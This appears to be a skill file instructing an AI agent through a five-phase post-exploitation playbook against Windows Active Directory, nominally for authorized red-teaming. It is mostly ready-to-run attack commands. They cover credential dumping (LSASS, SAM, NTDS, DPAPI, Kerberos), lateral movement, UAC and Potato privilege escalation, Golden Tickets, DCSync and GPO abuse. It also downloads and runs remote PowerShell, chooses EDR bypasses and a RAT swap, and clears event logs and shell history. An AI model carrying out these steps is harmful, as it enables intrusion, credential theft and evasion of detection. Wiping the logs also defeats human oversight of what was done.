---
name: lateral-movement
description: "Post-exploitation doctrine for authorized red-team engagements: five-phase playbook covering enumeration, credential collection, lateral movement, local privilege escalation, and domain domination. Includes EDR catalog with per-product detection signatures per technique."
---

# Lateral Movement + Privilege Escalation

Five-phase post-exploitation playbook for authorized adversary emulation. Execute phases in order; each feeds the next. Call `lateral_scan` → `harvest_credentials` → `move_lateral` → `escalate_privilege` → `domain_escalate`. Call `check_edr` before any payload delivery and `cleanup_artifacts` after each phase.

---

## Phase 1 — Enumeration

Map the environment before touching anything. Blind movement triggers EDR alerts.

### Host and network discovery

```
# From a Windows foothold
net view /all /domain
net group "Domain Computers" /domain
nmap -sV -sC -p 22,80,135,139,443,445,3389,5985,5986,47001 <subnet>
arp -a
ipconfig /all

# From a Linux foothold
netdiscover -r <subnet>
nmap -sn <subnet>/24 -oG - | grep "Up" | awk '{print $2}'
```

### Active Directory enumeration

```
# BloodHound (recommended: run once, analyze offline)
bloodhound-python -c All -u <user> -p <pass> -d <domain> -ns <dc_ip>
SharpHound.exe -c All --zipfilename bh_output.zip

# LDAP manual
ldapsearch -H ldap://<dc_ip> -x -D "<user>@<domain>" -w <pass> \
  -b "DC=<domain>,DC=com" "(objectClass=user)" sAMAccountName memberOf

# PowerView (in-memory)
IEX (New-Object Net.WebClient).DownloadString('http://<staging>/PowerView.ps1')
Get-DomainController
Get-DomainUser -Properties samaccountname,memberof,admincount
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty member
Find-LocalAdminAccess     # hits every domain machine; noisy
```

### Share enumeration

```
nmap --script smb-enum-shares -p 445 <target>
smbmap -H <target> -u <user> -p <pass>
crackmapexec smb <subnet>/24 -u <user> -p <pass> --shares
```

---

## Phase 2 — Credential Collection

One set of valid credentials unlocks the entire domain. Collect → record via `save_task_credential` → reuse.

### LSASS memory dump

```
# Via Mimikatz (reflective load — see payloads/invoke_mimikatz.ps1)
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
Invoke-Mimikatz -Command "sekurlsa::wdigest"       # plaintext if WDigest enabled

# Via ProcDump (AV-evaded binary or living-off-the-land)
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\ls.dmp
# Offline parse:
pypykatz lsa minidump ls.dmp
```

### SAM database (local accounts)

```
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\sys.hive
secretsdump.py -sam sam.hive -system sys.hive LOCAL
```

### NTDS.dit (domain controller — all hashes)

```
# VSS method (no ntdsutil noise)
vssadmin create shadow /for=c:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
secretsdump.py -ntds C:\ntds.dit -system C:\SYSTEM LOCAL -outputfile domain_hashes

# Remote (requires DA or replication rights)
secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc
```

### DPAPI (browser passwords, Wi-Fi keys, certificate private keys)

```
Invoke-Mimikatz -Command "sekurlsa::dpapi"
SharpDPAPI.exe credentials
SharpChrome.exe logins
```

### Kerberos tickets

```
Rubeus.exe dump /nowrap                              # extract all tickets from memory
Rubeus.exe kerberoast /outfile:spn_hashes.txt        # offline crack service account hashes
Rubeus.exe asreproast /outfile:asrep_hashes.txt      # no creds needed
hashcat -m 13100 spn_hashes.txt rockyou.txt --force  # Kerberoast
hashcat -m 18200 asrep_hashes.txt rockyou.txt --force # AS-REP roast
```

### Files and history

```
findstr /si password *.txt *.xml *.config *.ini *.ps1 *.bat
reg query HKLM /f password /t REG_SZ /s
type (Get-PSReadlineOption).HistorySavePath
cat ~/.bash_history
```

---

## Phase 3 — Lateral Movement

Move from current foothold to the next target using harvested credentials. Select method based on available ports and privileges.

### WMI (135/TCP, no SMB needed)

```
wmiexec.py <domain>/<user>:<pass>@<target>
wmiexec.py -hashes <LM>:<NTLM> <domain>/<user>@<target>
Invoke-WMIMethod -ComputerName <target> -Class Win32_Process -Name Create \
  -ArgumentList "cmd.exe /c powershell -enc <b64_payload>"
```

### WinRM (5985/5986 TCP)

```
evil-winrm -i <target> -u <user> -p <pass>
evil-winrm -i <target> -u <user> -H <ntlm_hash>
Enter-PSSession -ComputerName <target> -Credential (Get-Credential)
```

### SMB / PsExec (445/TCP, admin share write)

```
psexec.py <domain>/<user>:<pass>@<target>
psexec.py -hashes <LM>:<NTLM> <domain>/<user>@<target>
smbexec.py <domain>/<user>:<pass>@<target>
crackmapexec smb <target> -u <user> -p <pass> -x "whoami"
```

### SSH (22/TCP, Linux targets)

```
ssh -i id_rsa <user>@<target>
sshpass -p <pass> ssh <user>@<target>
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <user>@<target>
```

### DCOM (135/TCP)

```
dcomexec.py -object MMC20 <domain>/<user>:<pass>@<target>
# In-memory PowerShell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<target>"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c <payload>","7")
```

### RDP (3389/TCP, GUI access or Sticky-keys backdoor)

```
xfreerdp /u:<user> /p:<pass> /v:<target> /cert-ignore /dynamic-resolution
# Enable if closed:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389
```

---

## Phase 4 — Local Privilege Escalation

Move from low-privileged user to SYSTEM/root before extracting credentials or installing persistent implants.

### Token stealing (SeImpersonatePrivilege)

```
Invoke-Mimikatz -Command "privilege::debug token::elevate"
# Incognito
use incognito; list_tokens -u; impersonate_token "NT AUTHORITY\\SYSTEM"
```

### Service hijacking (weak ACL or unquoted path)

```
# Enumerate
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
winPEAS.exe servicesinfo
# Abuse
Invoke-ServiceAbuse -Name '<svc>' -UserName <user> -Password <pass>
```

### UAC bypass (medium → high integrity)

```
# fodhelper registry hijack (no prompt, W10/W11)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd.exe /c <payload>"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
Start-Process "C:\Windows\System32\fodhelper.exe"
```

### Potato family (service/IIS accounts → SYSTEM)

```
GodPotato.exe -cmd "cmd /c net localgroup administrators <user> /add"
PrintSpoofer.exe -i -c cmd
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c whoami"
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

### Kernel exploits

```
# Enumerate missing patches
systeminfo | findstr /B /C:"OS" /C:"Hotfix"
windows-exploit-suggester.py --systeminfo sysinfo.txt --database mssb.xls
wes.py systeminfo.txt -i "Critical" "Important" --exploits-only

# Common: CVE-2021-36934 (HiveNightmare), CVE-2022-21999 (PrintNightmare LPE),
#         MS16-032 (secondary logon), CVE-2023-21768 (AFD driver), CVE-2024-38041
```

---

## Phase 5 — Domain Domination

From DA or equivalent: extract all secrets, forge authentication, maintain access.

### DCSync (extract all domain hashes without touching DC disk)

```
Invoke-Mimikatz -Command "lsadump::dcsync /domain:<domain> /all /csv"
secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc
secretsdump.py -hashes <LM>:<NTLM> <domain>/<user>@<dc_ip> -just-dc
```

### Golden Ticket (unlimited domain persistence)

```
# 1. Get krbtgt hash
secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-user krbtgt

# 2. Forge ticket
Invoke-Mimikatz -Command "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<ntlm_hash> /ptt"

# 3. Impacket
ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <domain>/Administrator@<dc_ip>
```

### Kerberoasting (service account hash extraction)

```
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile spn_hashes.txt
hashcat -m 13100 spn_hashes.txt rockyou.txt -r best64.rule --force
```

### AS-REP Roasting (no credentials required)

```
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc_ip> -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt --force
```

### GPO abuse (affects all machines in linked OU)

```
# Find writable GPOs
Get-GPPermissions -All | Where-Object {$_.Permission -eq "GpoEditDeleteModifySecurity"}
# Abuse
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "<gpo_name>"
SharpGPOAbuse.exe --AddComputerTask --TaskName "update" --Author <domain>\<user> \
  --Command "cmd.exe" --Arguments "/c net localgroup administrators <user> /add" --GPOName "<gpo_name>"
Invoke-GPUpdate -Computer <target> -Force
```

---

## EDR Catalog

Detect installed EDR before delivering any payload. Use `check_edr` to probe the target.

| Product | Key Process(es) | Key Service(s) |
|---|---|---|
| Microsoft Defender / MDE | MsMpEng.exe, MsSense.exe | WinDefend, Sense |
| CrowdStrike Falcon | CSFalconService.exe, CSAgent.exe | CSFalconService |
| SentinelOne | SentinelAgent.exe, SentinelOne.exe | SentinelAgent |
| VMware Carbon Black EDR | cb.exe | CarbonBlack |
| VMware Carbon Black Cloud | CbDefense.exe | CbDefense |
| Cylance PROTECT | CylanceSvc.exe | CylanceSvc |
| ESET Endpoint Security | egui.exe, ekrn.exe | ekrn |
| Sophos | SAVService.exe, SophosFIM.exe | SAVService |
| Trend Micro OfficeScan/Apex | ntrtscan.exe, PccNTMon.exe | ntrtscan |
| Palo Alto Cortex XDR | cortex-xdr-agent.exe | CortexXDR |

### Detection signatures per technique

**LSASS dump**
- Defender/MDE: ASR rule "Block credential stealing from Windows LSAS subsystem" (GUID d9e) + M365D alert "Credential theft using mimikatz"
- CrowdStrike: SensorTelemetry.ProcessAccess on lsass.exe; ML-based Mimikatz prevention active by default
- SentinelOne: "OS Credential Dumping" deep-visibility event on handle open to lsass with PROCESS_VM_READ
- Carbon Black: ProcessOpen events on lsass flagged with credential_access threat class

**Kerberoasting**
- Defender/MDE: Event 4769 (Kerberos service ticket) with RC4 encryption (0x17) spike = likely roast
- CrowdStrike: "Kerberoasting" indicator in Falcon Discover; triggers when bulk 4769 events with RC4 observed
- SentinelOne: "Credential Access — Kerberoasting" story; monitors KerberosAS response volume

**Pass-the-Hash / Pass-the-Ticket**
- Defender/MDE: Event 4624 logon type 3 with NTLM + source host anomaly
- CrowdStrike: "Pass-the-Hash" indicator; kernel-level token monitoring
- SentinelOne: Lateral movement story on anomalous NTLM logon patterns

**AMSI bypass (PowerShell)**
- Defender/MDE: AMSI_RESULT_BLOCKED; ScriptBlock logging event 4104 catches reflection-based patches via pattern match on amsiInitFailed
- CrowdStrike: PowerShell script content inspection; ML model on obfuscated script structure
- SentinelOne: "AMSI Bypass" deep-visibility event; monitors for amsi.dll function patch in process memory

**Potato / SeImpersonate**
- Defender/MDE: Alert "Potential Potato privilege escalation" on named-pipe impersonation + SYSTEM token duplication
- CrowdStrike: "Token Theft" indicator via kernel callback on DuplicateToken with SYSTEM token
- SentinelOne: "Privilege Escalation" story on EfsRpc/print spooler RPC abuse pattern

**DCSync**
- Defender/MDE: Event 4662 on directory replication object with DS-Replication-Get-Changes GUID — primary DCSync indicator
- CrowdStrike: "DCSync" indicator; flags non-DC machine performing MS-DRSR replication
- SentinelOne: "Domain Controller Credential Dump" story on MS-DRSR protocol from non-DC process

### Bypass decision

After `check_edr` identifies the product:
1. Use `skills/edr-bypass-re` for telemetry mapping and bypass technique selection.
2. Swap RAT binary with an EDR-appropriate variant (indirect syscalls, custom PE loader, no disk write).
3. Re-run `harvest_credentials` after the new binary is established.

---

## Cleanup

Run `cleanup_artifacts` after each phase. Minimum artifact set to remove:

**Windows:**
```
del /f /q <payload_path>
del /f /q <dump_path>
wevtutil cl Security
wevtutil cl System
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
```

**Linux:**
```
rm -rf /tmp/<implant> /var/tmp/<staging>
history -c && history -w; cat /dev/null > ~/.bash_history
find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;
```
